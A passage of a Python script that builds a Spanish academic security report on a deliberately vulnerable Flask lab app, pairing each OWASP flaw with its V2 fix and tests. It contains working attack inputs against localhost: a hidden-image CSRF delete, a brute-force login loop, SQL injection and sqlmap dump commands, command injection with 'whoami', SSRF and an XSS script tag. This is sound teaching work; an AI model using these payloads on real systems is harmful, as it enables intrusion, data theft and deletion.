    ), label='Comando/payload:')
    add_figure_label(doc, 'Evidencia VUL-07 - reproduccion del ataque')
    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(
        '# El docente obtiene la lista completa de usuarios con passwords en plano,',
        '# aunque el enlace "Usuarios" no aparece en su menu:',
        '| id | username | password | rol      |',
        '|----|----------|----------|----------|',
        '| 1  | admin    | admin123 | admin    |',
        '| 2  | profesor | profesor | docente  |',
    ), label='Salida real (/admin/usuarios como docente):')
    add_figure_label(doc, 'Evidencia VUL-07 - password de admin visible para el docente')
    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(
        '@admin_required',
        'def admin_usuarios(): ...   # solo rol admin',
        '# Docente: 403 en /importar, /diagnostico, /admin/usuarios',
    ), label='Control implementado (V2):')
    add_note(doc, 'Probe 11 V2: el docente recibe 403 en /importar y /diagnostico; el CRUD docente es de solo lectura.')

    # ---- 5.8 VUL-08 CSRF
    add_heading_apa(doc, '5.8 VUL-08 CSRF - eliminaciones por GET', level=3)
    create_table(doc, ['Campo', 'Detalle'],
        [
            ('Identificador', 'VUL-08'),
            ('Categoria OWASP', 'A01 - Broken Access Control'),
            ('CWE (MITRE)', 'CWE-352'),
            ('Criticidad', 'Alta'),
            ('Endpoint / ruta', 'GET /estudiantes/eliminar/<id>, /cursos/eliminar, /notas/eliminar, /archivos/eliminar'),
            ('Causa raiz', 'Eliminaciones por GET sin token CSRF'),
            ('Impacto', 'Un visitante malicioso fuerza la eliminacion de datos en la sesion de un admin'),
        ])
    add_table_label(doc, 'Tabla 12. Ficha tecnica VUL-08')
    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(
        '# Pagina maliciosa que, al ser visitada por un admin con sesion activa,',
        '# elimina el estudiante 3 (el navegador envia la cookie de sesion sola):',
        '<img src="http://localhost:5001/estudiantes/eliminar/3" style="display:none">',
    ), label='Comando/payload:')
    add_figure_label(doc, 'Evidencia VUL-08 - reproduccion del ataque')
    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(
        'GET /estudiantes/eliminar/3  ->  HTTP/1.1 302 FOUND  (registro eliminado)',
        '# La eliminacion se acepta sin token alguno ni confirmacion POST.',
    ), label='Salida real:')
    add_figure_label(doc, 'Evidencia VUL-08 - eliminacion aceptada por GET')
    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(
        '# Deletes solo por POST + token CSRF (Flask-WTF):',
        'GET /estudiantes/eliminar/1 -> 405 Method Not Allowed',
        'POST sin csrf_token        -> 400 Bad Request',
    ), label='Control implementado (V2):')
    add_note(doc, 'Probes 4 y 5 V2: POST sin token responde 400; GET delete responde 405. Ninguno elimina datos.')

    # ---- 5.9 VUL-09 Crypto
    add_heading_apa(doc, '5.9 VUL-09 Fallas criptograficas - passwords en texto plano', level=3)
    create_table(doc, ['Campo', 'Detalle'],
        [
            ('Identificador', 'VUL-09'),
            ('Categoria OWASP', 'A02 - Cryptographic Failures'),
            ('CWE (MITRE)', 'CWE-256, CWE-798'),
            ('Criticidad', 'Critica'),
            ('Endpoint / ruta', 'Base de datos usuarios (init_db.py); app.secret_key en app.py'),
            ('Causa raiz', 'Passwords sin hashing; secret_key hardcodeada "12345"'),
            ('Impacto', 'Credenciales legibles ante un dump; forja de cookies de sesion'),
        ])
    add_table_label(doc, 'Tabla 13. Ficha tecnica VUL-09')
    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(
        '# El dump de sqlmap (VUL-02) devuelve los passwords en claro:',
        'cat docs/sqlmap_evidence/estudiantes/localhost/dump/SQLite_masterdb/usuarios.csv',
    ), label='Comando/payload:')
    add_figure_label(doc, 'Evidencia VUL-09 - reproduccion del ataque')
    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(
        'id,rol,password,username',
        '1,admin,admin123,admin',
        '2,docente,profesor,profesor',
        '',
        '# Y en app.py (V1):',
        "app.secret_key = '12345'",
    ), label='Salida real (CSV + codigo):')
    add_figure_label(doc, 'Evidencia VUL-09 - passwords en texto plano y secret hardcodeado')
    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(
        "hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))",
        "if bcrypt.checkpw(password, user['password'].encode()): ...",
        'app.secret_key = os.getenv("SECRET_KEY")   # desde .env',
    ), label='Control implementado (V2):')
    add_note(doc, 'En la V2 los passwords se guardan con bcrypt cost factor 12; un dump no expone las credenciales.')

    # ---- 5.10 VUL-10 Componentes
    add_heading_apa(doc, '5.10 VUL-10 Componentes vulnerables - CVE-2024-34069 (Werkzeug 3.0.1)', level=3)
    create_table(doc, ['Campo', 'Detalle'],
        [
            ('Identificador', 'VUL-10'),
            ('Categoria OWASP', 'A06 - Vulnerable and Outdated Components'),
            ('CWE (MITRE)', 'CWE-1104'),
            ('Criticidad', 'Media'),
            ('Endpoint / ruta', 'Dependencia Werkzeug==3.0.1 (requirements.txt)'),
            ('Causa raiz', 'Version de Werkzeug afectada por CVE-2024-34069 (PIN del debugger predecible)'),
            ('Impacto', 'Ejecucion arbitraria de codigo si el atacante alcanza el debugger interactivo'),
        ])
    add_table_label(doc, 'Tabla 14. Ficha tecnica VUL-10')
    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(
        'python -c "import importlib.metadata as m; print(m.version(\'werkzeug\'))"',
    ), label='Comando/payload:')
    add_figure_label(doc, 'Evidencia VUL-10 - reproduccion del ataque')
    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(
        '3.0.1',
        '',
        '# requirements.txt (V1):',
        'Flask==3.0.3',
        'Werkzeug==3.0.1    <- vulnerable a CVE-2024-34069',
    ), label='Salida real:')
    add_figure_label(doc, 'Evidencia VUL-10 - version de Werkzeug instalada')
    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(
        'Werkzeug>=3.0.3    # corrige CVE-2024-34069',
        '# Dependencias validadas con Safety (SCA) en el pipeline.',
    ), label='Control implementado (V2):')
    add_note(doc, 'CVE-2024-34069 permite predecir el PIN del debugger de Werkzeug en ciertos entornos (por ejemplo, contenedores con machine-id predecible).')

    # ---- 5.11 VUL-11 Misconfiguration
    add_heading_apa(doc, '5.11 VUL-11 Security Misconfiguration - debug=True y trazas expuestas', level=3)
    create_table(doc, ['Campo', 'Detalle'],
        [
            ('Identificador', 'VUL-11'),
            ('Categoria OWASP', 'A05 - Security Misconfiguration'),
            ('CWE (MITRE)', 'CWE-209'),
            ('Criticidad', 'Alta'),
            ('Endpoint / ruta', 'app.py (app.run(debug=True)); cualquier excepcion no controlada'),
            ('Causa raiz', 'Modo debug activo en un entorno expuesto'),
            ('Impacto', 'Exposicion de tracebacks con rutas absolutas, variables locales y el debugger interactivo de Werkzeug'),
        ])
    add_table_label(doc, 'Tabla 15. Ficha tecnica VUL-11')
    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(
        '# Provocar una excepcion no controlada (SQLi que rompe la sintaxis):',
        'curl -b cookies.txt --data-urlencode "host=\' " http://localhost:5001/diagnostico',
    ), label='Comando/payload:')
    add_figure_label(doc, 'Evidencia VUL-11 - reproduccion del ataque')
    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(
        '# Werkzeug devuelve el debugger interactivo con el traceback completo:',
        '#  - versiones exactas de Werkzeug/Python',
        '#  - rutas absolutas del sistema',
        '#  - codigo fuente y variables locales del stack',
        '#  - formulario "Debugger PIN" (explotable con CVE-2024-34069)',
    ), label='Salida real (pagina de error):')
    add_figure_label(doc, 'Evidencia VUL-11 - traceback y debugger expuestos')
    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(
        '# debug=False + paginas de error personalizadas sin trazas:',
        '@app.errorhandler(404) -> render_template("404.html")',
        '@app.errorhandler(500) -> render_template("500.html")',
    ), label='Control implementado (V2):')
    add_note(doc, 'Probe 6 V2: una ruta inexistente responde 404 con pagina personalizada, sin tracebacks.')

    # ---- 5.12 VUL-12 Brute force
    add_heading_apa(doc, '5.12 VUL-12 Fuerza bruta sin limite - ausencia de rate limiting', level=3)
    create_table(doc, ['Campo', 'Detalle'],
        [
            ('Identificador', 'VUL-12'),
            ('Categoria OWASP', 'A04 / A07 - Insecure Design y Auth Failures'),
            ('CWE (MITRE)', 'CWE-307'),
            ('Criticidad', 'Alta'),
            ('Endpoint / ruta', 'POST /login (sin rate limit ni lockout)'),
            ('Causa raiz', 'No hay limitacion de peticiones ni bloqueo de cuenta'),
            ('Impacto', 'Fuerza bruta sin restricciones sobre las credenciales'),
        ])
    add_table_label(doc, 'Tabla 16. Ficha tecnica VUL-12')
    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(
        'for i in $(seq 1 30); do',
        '  curl -s -o /dev/null -w "%{http_code}\n" \\',
        '    -d "username=admin&password=intento$i" http://localhost:5001/login',
        'done',
    ), label='Comando/payload:')
    add_figure_label(doc, 'Evidencia VUL-12 - reproduccion del ataque')
    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(
        '# Las 30 peticiones se procesan sin ningun 429, captcha ni bloqueo:',
        '200 200 200 200 200 200 200 200 200 200',
        '200 200 200 200 200 200 200 200 200 200',
        '200 200 200 200 200 200 200 200 200 200',
        '# Y ninguna peticion queda registrada (ver VUL-13).',
    ), label='Salida real:')
    add_figure_label(doc, 'Evidencia VUL-12 - sin limite de intentos')
    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(
        '# Flask-Limiter: 5 intentos fallidos/minuto -> 429 Too Many Requests',
        '# Lockout de cuenta: 5 fallos consecutivos -> bloqueo de 10 minutos',
    ), label='Control implementado (V2):')
    add_note(doc, 'Probe 12 V2: el sexto POST en menos de un minuto responde 429 (rate-limit).')

    # ---- 5.13 VUL-13 Logging
    add_heading_apa(doc, '5.13 VUL-13 Fallas de logging y monitoreo', level=3)
    create_table(doc, ['Campo', 'Detalle'],
        [
            ('Identificador', 'VUL-13'),
            ('Categoria OWASP', 'A09 - Logging and Monitoring Failures'),
            ('CWE (MITRE)', 'CWE-778'),
            ('Criticidad', 'Media'),
            ('Endpoint / ruta', 'Toda la aplicacion (app.py no registra eventos)'),
            ('Causa raiz', 'Ausencia total de logging de seguridad'),
            ('Impacto', 'Los ataques de esta guia son indetectables; no hay auditoria'),
        ])
    add_table_label(doc, 'Tabla 17. Ficha tecnica VUL-13')
    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(
        '# Repetir cualquiera de los ataques anteriores (SQLi, RCE, SSRF, fuerza bruta)',
        'find . -name "*.log"     # y comprobar que no existe ningun log de seguridad',
    ), label='Comando/payload:')
    add_figure_label(doc, 'Evidencia VUL-13 - reproduccion del ataque')
    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(
        '# No existe ningun archivo de log en el proyecto:',
        '(ningun resultado)',
        '# La unica salida es el access log de desarrollo de Werkzeug, sin persistencia',
        '# ni distincion entre trafico legitimo y ataques.',
    ), label='Salida real:')
    add_figure_label(doc, 'Evidencia VUL-13 - ausencia de registros de auditoria')
    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(
        '# security.log: logins fallidos, subidas de archivos, acciones de admin',
        'logger.info(f"Login exitoso: {username}")',
        'logger.warning(f"Login fallido: {username} desde {ip}")',
    ), label='Control implementado (V2):')
    add_note(doc, 'La V2 registra intentos de login, subidas y acciones administrativas en security.log.')

    doc.add_page_break()

    # ================================================================
    # 6. VERIFICACION V2
    # ================================================================
    add_heading_apa(doc, '6. Verificacion de la V2 (bloqueo de los ataques)', level=2)

    add_paragraph(doc,
        'La V2 desplegada en https://localhost se verifico con 12 probes no '
        'destructivos (script scripts/verificar_v2.ps1). El resumen fue '
        'PASS=18 FAIL=0 (los probes 1, 2, 8 y 11 ejecutan multiples comprobaciones).',
        first_line_indent=Cm(1.27))

    create_table(doc,
        ['#', 'Probe', 'Resultado'],
        [
            ('1', 'HTTP -> HTTPS (redirect 301)', 'PASS'),
            ('2', 'Headers de seguridad (HSTS, CSP, X-Frame-Options, nosniff)', 'PASS'),
            ('3', 'SQLi en login sin bypass (200)', 'PASS'),
            ('4', 'POST sin token CSRF -> 400', 'PASS'),
            ('5', 'Delete por GET -> 405', 'PASS'),
            ('6', 'Ruta inexistente -> 404 personalizado', 'PASS'),
            ('7', 'RCE (whoami) -> "Comando no permitido"', 'PASS'),
            ('8', 'SSRF a metadata/loopback/RFC1918 -> 403', 'PASS'),
            ('9', 'SQLi UNION sin fuga de hashes bcrypt', 'PASS'),
            ('10', 'Upload .html malicioso -> "Tipo no permitido"', 'PASS'),
            ('11', 'RBAC docente en /importar y /diagnostico -> 403', 'PASS'),
            ('12', 'Fuerza bruta -> 429 (rate-limit)', 'PASS'),
        ])
    add_table_label(doc, 'Tabla 18. Probes no destructivos contra la V2 (PASS=18, FAIL=0)')

    add_paragraph(doc,
        'Adicionalmente, la V2 cuenta con 59 tests automatizados (11 archivos) '
        'que cubren cada correccion:',
        first_line_indent=Cm(1.27))

    create_table(doc,
        ['Archivo de tests', 'Verificacion'],
        [
            ('test_sqli.py', 'SQLi no funciona en busqueda ni login'),
            ('test_auth.py', 'Login correcto/incorrecto y hashing bcrypt'),
            ('test_upload.py', 'Extensiones no permitidas rechazadas y magic bytes'),
            ('test_rbac.py', 'RBAC: docente solo lectura, admin CRUD'),
            ('test_csrf_delete.py', 'Deletes solo por POST + token CSRF'),
            ('test_errors.py', 'Paginas 403/404/500 sin trazas'),
            ('test_cookies.py', 'Cookies HttpOnly/SameSite/Secure'),
            ('test_ssrf.py', 'SSRF bloqueado en /importar'),
            ('test_diagnostico.py', 'RCE bloqueado en /diagnostico (allowlist)'),
            ('test_lockout.py', 'Lockout de cuenta tras intentos fallidos'),
            ('test_base.py', 'Configuracion compartida del test client'),
        ])
    add_table_label(doc, 'Tabla 19. Tests automatizados de seguridad de la V2 (59/59)')

    # ================================================================
    # 7. RESUMEN DE RESULTADOS
    # ================================================================
    add_heading_apa(doc, '7. Resumen de resultados', level=2)

    create_table(doc,
        ['VUL', 'Vulnerabilidad', 'OWASP', 'Criticidad', 'V1', 'V2'],
        [
            ('VUL-01', 'SQLi - bypass login', 'A03', 'Critica', 'Explotada', 'Bloqueada'),
            ('VUL-02', 'SQLi - UNION + dump', 'A03', 'Critica', 'Explotada', 'Bloqueada'),
            ('VUL-03', 'RCE /diagnostico', 'A03', 'Critica', 'Explotada', 'Bloqueada'),
            ('VUL-04', 'RCE upload + traversal', 'A03/A08', 'Critica', 'PoC', 'Bloqueada'),
            ('VUL-05', 'SSRF importar', 'A10', 'Alta', 'Explotada', 'Bloqueada'),
            ('VUL-06', 'XSS almacenado', 'A08', 'Alta', 'Explotada', 'Bloqueada'),
            ('VUL-07', 'Broken Access Control', 'A01', 'Critica', 'Explotada', 'Bloqueada'),
            ('VUL-08', 'CSRF delete GET', 'A01', 'Alta', 'Explotada', 'Bloqueada'),
            ('VUL-09', 'Fallas criptograficas', 'A02', 'Critica', 'Presente', 'Corregida'),
            ('VUL-10', 'Componentes vulnerables', 'A06', 'Media', 'Presente', 'Corregida'),
            ('VUL-11', 'Misconfiguration', 'A05', 'Alta', 'Explotada', 'Bloqueada'),
            ('VUL-12', 'Fuerza bruta sin limite', 'A04/A07', 'Alta', 'Explotada', 'Bloqueada'),
            ('VUL-13', 'Logging y monitoreo', 'A09', 'Media', 'Ausente', 'Implementado'),
        ])
    add_table_label(doc, 'Tabla 20. Resumen de resultados V1 vs V2')

    add_paragraph(doc,
        'Total: 13 vulnerabilidades documentadas. 10 de las 10 categorias de '
        'OWASP Top 10 2021 estan cubiertas en la V1 de forma explotable, y todas '
        'se corrigen o bloquean en la V2.',
        first_line_indent=Cm(1.27))

    doc.add_page_break()

    # ================================================================
    # 8. CONCLUSIONES Y RECOMENDACIONES
    # ================================================================
    add_heading_apa(doc, '8. Conclusiones y recomendaciones', level=2)

    add_paragraph(doc,
        'La V1, construida deliberadamente insegura, permite observar en codigo '
        'real el funcionamiento de las principales vulnerabilidades de OWASP Top '
        '10 2021 y su explotacion con herramientas como sqlmap. La V2 bloquea '
        'cada uno de estos ataques (18/18 probes, 59/59 tests), lo que demuestra '
        'que las correcciones son verificables y efectivas.',
        first_line_indent=Cm(1.27))

    add_heading_apa(doc, '8.1 Recomendaciones priorizadas', level=3)
    recs = [
        'P1 (inmediato): parametrizar todas las consultas SQL (VUL-01/02); '
        'eliminar subprocess con shell=True (VUL-03); hashear passwords con '
        'bcrypt y secret por variable de entorno (VUL-09); aplicar RBAC real en '
        'backend (VUL-07).',
        'P1 (inmediato): desactivar debug en produccion y activar paginas de '
        'error sin trazas (VUL-11); actualizar Werkzeug >= 3.0.3 (VUL-10).',
        'P2 (corto plazo): validar subidas por extension/MIME/magic bytes y '
        'guardar fuera del webroot (VUL-04/06); bloquear IPs privadas y '
        'redirecciones en /importar (VUL-05); deletes por POST + CSRF (VUL-08).',
        'P2 (corto plazo): aplicar rate limiting y lockout de cuenta (VUL-12); '
        'registrar eventos de seguridad en un log de auditoria (VUL-13).',
        'P3 (medio plazo): integrar SAST (Bandit) y SCA (Safety) en el pipeline '
        'y mantener el corpus de tests automatizados de seguridad.',
    ]
    for r in recs:
        p = doc.add_paragraph(style='List Bullet')
        run = p.add_run(r)
        run.font.size = Pt(12)
        run.font.name = 'Times New Roman'

    add_heading_apa(doc, '8.2 Trabajo futuro', level=3)
    futuro = [
        'Ejecutar el flujo de forja de cookie de sesion con itsdangerous usando '
        'el secret_key conocido de la V1.',
        'Automatizar el escaneo de puertos internos via SSRF ciego contra la red '
        'Docker "lab".',
        'Evaluar con un escaner activo (OWASP ZAP / Burp) la V2 y comparar con '
        'los hallazgos de esta guia.',
        'Extender la evaluacion a un esquema de certificado real (Let\'s Encrypt) '
        'para el despliegue de produccion.',
    ]
    for f in futuro:
        p = doc.add_paragraph(style='List Bullet')
        run = p.add_run(f)
        run.font.size = Pt(12)
        run.font.name = 'Times New Roman'

    # ================================================================
    # 9. REFERENCIAS NORMATIVAS
    # ================================================================
    add_heading_apa(doc, '9. Referencias normativas', level=2)

    refs = [
        'ISO/IEC 15408-1:2022. Information security, cybersecurity and privacy '
        'protection - Evaluation criteria for IT security - Part 1: Introduction '
        'and general model.',
        'ISO/IEC 15408-2:2022. Part 2: Security functional components (SFR).',
        'ISO/IEC 15408-3:2022. Part 3: Security assurance components (SAR).',
        'ISO/IEC 18045:2022. Methodology for IT security evaluation.',
        'ISO/IEC 15446:2017. Guide for the production of Protection Profiles and '
        'Security Targets.',
        'OWASP. (2021). OWASP Top Ten 2021. https://owasp.org/Top10/',
        'OWASP. (2023). Web Security Testing Guide (WSTG). '
        'https://owasp.org/www-project-web-security-testing-guide/',
        'MITRE. CWE - Common Weakness Enumeration. https://cwe.mitre.org/',
        'NIST. (2024). CVE-2024-34069 (Werkzeug). '
        'https://nvd.nist.gov/vuln/detail/CVE-2024-34069',
        'IETF. (2018). RFC 8446 - The Transport Layer Security (TLS) Protocol '
        'Version 1.3.',
        'OWASP. (2023). SQL Injection Prevention Cheat Sheet.',
        'OWASP. (2023). Cross-Site Scripting Prevention Cheat Sheet.',
        'OWASP. (2023). File Upload Cheat Sheet.',
    ]
    for ref in refs:
        p = doc.add_paragraph()
        run = p.add_run(ref)
        run.font.size = Pt(12)
        run.font.name = 'Times New Roman'
        p.paragraph_format.left_indent = Cm(1.27)
        p.paragraph_format.first_line_indent = Cm(-1.27)
        p.paragraph_format.space_after = Pt(6)

    doc.add_page_break()

    # ================================================================
    # ANEXO A. COMANDOS UTILIZADOS
    # ================================================================
    add_heading_apa(doc, 'Anexo A. Comandos utilizados', level=2)

    add_code_block(doc,
        C(
            '# Despliegue',
            'docker compose up -d                 # v1:5001 + v2/nginx:443 (sqlmap on-demand)',
            '',
            '# SQLi manual (V1)',
            'curl -s -X POST http://localhost:5001/login -d "username=admin\' OR \'1\'=\'1\' --&password=x"',
            'curl -s "http://localhost:5001/estudiantes?buscar=\' OR 1=1 --"',
            '',
            '# SQLi automatizado (V1) - sqlmap 1.10.7',
            'sqlmap -u "http://localhost:5001/estudiantes?buscar=test" --cookie="session=..." \\',
            '  --technique=U --level=2 --risk=2 -T usuarios --dump --output-dir=docs/sqlmap_evidence/estudiantes',
            'docker compose run --rm sqlmap -u "http://v1:5001/login" \\',
            '  --data="username=admin&password=x" --batch --dump -T usuarios --output-dir=/out',
            '',
            '# RCE (V1)',
            'curl -b cookies.txt --data-urlencode "host=127.0.0.1 & whoami" http://localhost:5001/diagnostico',
            '',
            '# SSRF (V1)',
            'curl -b cookies.txt --data-urlencode "estudiante_id=1" \\',
            '  --data-urlencode "url=http://127.0.0.1:5001/login" http://localhost:5001/estudiantes/importar-foto',
            '',
            '# XSS (V1) - vector observaciones con |safe',
            'curl -b cookies.txt --data-urlencode "observaciones=<script>alert(1)</script>" http://localhost:5001/notas/crear',
            '',
            '# Verificacion V2 (18/18 PASS)',
            'powershell -ExecutionPolicy Bypass -File .\\scripts\\verificar_v2.ps1 -Brute',
            '',
            '# Tests de seguridad V2',
            'pytest -q   # 59/59 passing',
        ),
        label='Comandos de la evaluacion:')

    add_note(doc,
        'Toda la evidencia de esta evaluacion se conserva en el repositorio bajo '
        'docs/sqlmap_evidence/ (dump CSV, logs y target de sqlmap) y en las guias '
        'docs/PENTEST.md, docs/SQLMAP_ATTACK.md y v1/docs/PENTEST.md.')

    doc.save('Trabajo_Seguridad_Informatica.docx')
    print('Informe generado: Trabajo_Seguridad_Informatica.docx')


if __name__ == '__main__':
    create_report()
